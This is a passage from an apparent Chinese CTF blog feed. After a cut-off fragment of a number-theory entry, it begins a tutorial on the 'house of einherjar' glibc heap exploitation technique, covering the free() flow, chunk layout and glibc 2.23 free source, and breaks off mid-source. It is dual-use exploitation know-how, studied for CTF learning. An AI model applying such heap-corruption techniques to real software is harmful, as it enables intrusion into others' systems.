rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><msub><mi>A</mi><msub><mi>α</mi><mn>1</mn></msub></msub><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mi>A</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若A_{\alpha_1}···A\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139199999999997em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.0037em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></blockquote><h2 id="剩余类及完全剩余系"><a class="markdownIt-Anchor" href="#剩余类及完全剩余系"></a> 剩余类及完全剩余系</h2>]]></content>
    
    
    <summary type="html">前言：公因数、公倍数，同余和算数基本定理了解完了开始进一步数论学习</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="数论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-einherjar</title>
    <link href="http://iyheart.github.io/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/"/>
    <id>http://iyheart.github.io/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/</id>
    <published>2025-01-15T08:29:56.000Z</published>
    <updated>2025-02-10T12:49:03.383Z</updated>
    
    <content type="html"><![CDATA[<ul><li>14号差不多了解了<code>house of spirit</code>的堆利用方法，现在就来学习<code>house-of-einherjar</code>的堆利用。</li><li>在学习<code>house of einherjar </code>之前，要先学习<code>unlink</code>的这个堆漏洞的利用，这样会对<code>unlink</code>的流程以及<code>free()</code>的过程会更加清晰。</li><li><code>house of einherjar</code>的这个堆利用适用范围``2.23—— 至今`</li></ul><h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li><p>之前学习了<code>unlink</code>技术，有一段时间没有做<code>unlink</code>的相关题型，所以先简单的总结一下<code>unlink</code>的过程，以及堆的前向合并以及后向和合并。并且重点强调堆中的隐式链表技术（该技术在<code>house of spirit</code>中有稍微提过一点）</p></li><li><p>这里继续放出<code>free()</code>和<code>unlink</code>的源码，接下来要看源码，理清一下<code>free()</code>的流程，这样有助于更好的学习<code>house of spirit</code>这个堆利用方式</p></li></ul><h2 id="free函数流程"><a class="markdownIt-Anchor" href="#free函数流程"></a> free函数流程</h2><ul><li>通过略读<code>free</code>函数，大概理清了<code>free</code>函数的具体流程</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250116221335784.png" alt="image-20250116221335784"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250116220931136.png" alt="image-20250116220931136"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250116220955481.png" alt="image-20250116220955481"></p><h2 id="堆管理隐式链表技术"><a class="markdownIt-Anchor" href="#堆管理隐式链表技术"></a> 堆管理隐式链表技术</h2><ul><li>堆块在被释放的时候如果被放入了<code>bins</code>中他是会被链表这个结构给管理起来的。</li><li>而我们在按顺序申请堆块的时候，每个堆块都有在物理地址上相邻的堆块。对于每个堆块如果找到物理地址上相邻的其他两个堆块，这就是堆管理的隐式链表技术。</li><li>我们就用如下示例程序对堆管理的隐式链表技术进行一个比较详细的说明。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>* p;</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">0x150</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o test test.c</span></span><br></pre></td></tr></table></figure><ul><li>我们直接对编译好的<code>test</code>程序进行动态调试。使用<code>ni</code>命令将该程序执行到调用完<code>free</code>之后，执行<code>ret</code>指令之前。这时我们使用<code>vis</code>命令查看一下堆块会看到如下结果。图中红色框的都是每个堆块的<code>prev_size</code>位和<code>size</code>位。所谓隐式链表，也就是该堆块并没有指针去指向下一个chunk。而是使用自己的<code>prev_size</code>和<code>size</code>从而去确定低地址的堆块的位置，和高地址堆块的位置。<ul><li>在图中对于<code>绿色</code>区域，它的<code>prev_size=0x160</code>，而它的<code>size=0x60</code></li><li>所以我们就可以通过绿色这个堆块的起始地址<code>p = 0x107c1a0</code>通过<code>p-p.prev_size=0x107c040</code>从而计算出与该堆块的物理地址相邻且更低的堆块的起始地址。</li><li>要计算与该堆块的物理地址相邻且更高的堆块的起始地址，就可以通过<code>p=0x107c1a0</code>,<code>p+(p.size&gt;&gt;3)&lt;&lt;3=0x107c200</code>得到</li><li>注意<code>prev_size</code>这个数据，只有在该堆块<code>prev_inuse</code>这个位为<code>0</code>的时候会有效，当<code>prev_inuse</code>为<code>1</code>的时候<code>prev_size</code>是无效的，不会起作用。</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129125744325.png" alt="image-20250129125744325"></p><h2 id="free函数相关源码"><a class="markdownIt-Anchor" href="#free函数相关源码"></a> free函数相关源码</h2><h3 id="__libc_free源码"><a class="markdownIt-Anchor" href="#__libc_free源码"></a> __libc_free源码</h3><details>    <summary>__libc_free</summary><ul><li><code>glibc2.23--malloc.c</code>第2933行开始</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure></details><h3 id="_int_free源码"><a class="markdownIt-Anchor" href="#_int_free源码"></a> _int_free源码</h3><details>    <summary>_int_free源码</summary><ul><li><code>glibc2.23--malloc.c</code>第3836行开始</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ free ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck 